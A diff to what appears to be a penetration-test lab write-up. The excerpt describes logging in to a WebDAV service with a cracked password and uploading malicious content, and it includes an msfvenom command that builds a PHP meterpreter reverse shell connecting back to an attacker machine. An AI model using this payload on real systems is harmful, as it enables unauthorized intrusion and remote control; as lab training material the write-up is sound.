@@ -78,11 +78,12 @@ The result is the password in plain text 'linux4u', and now we can try to login 
 
 ![webdav login](https://user-images.githubusercontent.com/90374994/155534746-23c7d436-04d9-4dbd-9c24-46ee76fe3ca8.png)
 
+
 **Seventh Step.** Now that we are logged in to the WebDAV service we can try to create and upload malicious content.
 
 ![webdav1](https://user-images.githubusercontent.com/90374994/155537659-0e4003d1-0910-4e6e-a7fa-81ee20ae913c.png)
 
-We will try and craft a meterpreter reverse shell using MSFVenom. Since the reverse shell will attempt to connect back to our attacker machine (Kali), we will need to specify the LHOST as the Kali VM's IP address 192.168.1.90 and the LPORT as 4444:
+We will craft a meterpreter reverse shell using MSFVenom. Since the reverse shell will attempt to connect back to our attacker machine (Kali), we will need to specify the LHOST as the Kali VM's IP address 192.168.1.90 and the LPORT as 4444:
 
 ```bash
 msfvenom -p php/meterpreter/reverse_tcp -lhost=192.168.1.90 lport=4444 > shell.php
